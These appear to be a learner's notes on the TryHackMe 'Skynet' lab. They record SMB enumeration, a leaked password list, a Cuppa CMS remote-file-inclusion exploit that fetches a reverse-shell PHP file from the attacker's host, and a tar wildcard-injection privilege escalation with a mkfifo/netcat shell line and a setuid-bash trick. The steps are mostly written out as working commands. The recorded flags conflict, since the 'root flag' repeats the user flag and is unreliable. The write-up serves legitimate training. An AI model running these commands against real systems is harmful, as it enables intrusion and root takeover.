
#CTF  #Easy 

https://tryhackme.com/r/room/skynet

```
10.10.35.218

nano /etc/hosts

nmap -sS -sC -Pn -F skynet.thm

PORT    STATE SERVICE
22/tcp  open  ssh
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)

80/tcp  open  http
|_http-title: Skynet

110/tcp open  pop3
|_pop3-capabilities: CAPA AUTH-RESP-CODE SASL PIPELINING RESP-CODES TOP UIDL

139/tcp open  netbios-ssn

143/tcp open  imap
|_imap-capabilities: IMAP4rev1 IDLE capabilities listed LITERAL+ have post-login more SASL-IR Pre-login ID OK LOGIN-REFERRALS LOGINDISABLEDA0001 ENABLE

445/tcp open  microsoft-ds
MAC Address: 02:12:03:B9:22:2D (Unknown)

Host script results:
|_clock-skew: mean: 1h59m59s, deviation: 3h27m50s, median: 0s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2025-01-30T15:48:24-06:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-01-30T21:48:24
|_  start_date: N/A

gobuster

/admin
/ai
/config
/squirrelmail
/server-status

smbmap -H 10.10.35.218
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.35.218...
[+] IP: 10.10.35.218:445	Name: skynet.thm                                        
Disk           Permissions	Comment
----           -----------	-------
print$        NO ACCESS	Printer Drivers                                  dr--r--r--    0 Thu Nov 26 16:04:00 2020	.
dr--r--r--    0 Tue Sep 17 08:20:17 2019	..
fr--r--r--    163 Wed Sep 18 04:04:59 2019	attention.txt
dr--r--r--    0 Wed Sep 18 05:42:16 2019	logs
anonymous     READ ONLY	Skynet Anonymous Share
milesdyson    NO ACCESS	Miles Dyson Personal Share
IPC$          NO ACCESS	IPC Service (skynet server (Samba, Ubuntu))

smbclient '\\10.10.35.218\anonymous'
password: [enter]

ls
attention.txt
logs
get attention.txt

terminal tab
cat attention.txt
	A recent system malfunction has caused various passwords to be 
	changed. All skynet employees are required to change their password 
	after seeing this.
	-Miles Dyson

cd logs
ls 
log1.txt
log2.txt
log3.txt

terminal tab
cat log1.txt   = list of passwords
cat log2.txt   = blank
cat log3.txt   = blank

http://10.10.35.218/squirrelmail/src/login.php

milesdyson : cyborg007haloterminator

# we're in!

serenakogan@skynet

We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`

01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111
== balls have zero to me to me to me to me to me to me to me to me to

smbclient -U milesdyson '\\10.10.35.218\milesdyson'

)s{A&2Z=F^n_E.B`

# we're in!

ls

Improving Deep Neural Networks.pdf      
Natural Language Processing-Building Sequence Models.pdf      
Convolutional Neural Networks-CNN.pdf      
notes                               D        
Neural Networks and Deep Learning.pdf      
Structuring your Machine Learning Project.pdf      

cd notes
ls

get important.txt
cat important.txt

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife

http://10.10.35.218/45kra24zxs28v3yd/

Miles Dyson personal page

gobuster dir -u http://10.10.35.218/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

/administrator

http://10.10.35.218/45kra24zxs28v3yd/administrator/

login page

# check for exploits for Cuppa CMS
https://www.exploit-db.com/exploits/25971

alertConfigField.php
download the 25971.txt file

10.10.232.132
http://10.10.232.132/45kra24zxs28v3yd/administrator/

http://10.10.232.132/45kra24zxs28v3yd/administrator/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

curl http://10.10.232.132/45kra24zxs28v3yd/administrator/cuppa/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

curl http://10.10.232.132/45kra24zxs28v3yd/administrator/cuppa/alerts/alertConfigField.php?urlConfig=http://10.10.36.64:8000/poc.php

poc.php
<?php
system('whoami');
?>

python3 -m http.server 8000

nc -nlvp 4445

get reverse-shell.php ready

curl http://10.10.232.132/45kra24zxs28v3yd/administrator/cuppa/alerts/alertConfigField.php?urlConfig=http://10.10.36.64:8000/reverse-shell.php

ls
cd milesdyson
cat user.txt
7ce5c2109a40f958099283600a9e807

# need to priv esc 

crontabs has backups/backup.sh

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmpf|/bin/sh -i | nc $ip >/tmp/f" > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
tar cf archive.tar

/bin/bash -p
whoami

cd /var/www/html

printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1

ls -la /bin/bash
/bin/bash -p
whoami
ls -la
cat root.txt

3f0373db24753accc7179a282cd6a949

```

```
What is Miles password for his emails?  Enumerate Samba
cyborg007haloterminator

What is the hidden directory?
/45kra24zxs28v3yd

What is the vulnerability called when you can include a remote file for malicious purposes?

remote file inclusion

What is the user flag?
7ce5c2109a40f958099283600a9ae807

What is the root flag?
7ce5c2109a40f958099283600a9e807

```

log1.txt
```
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```

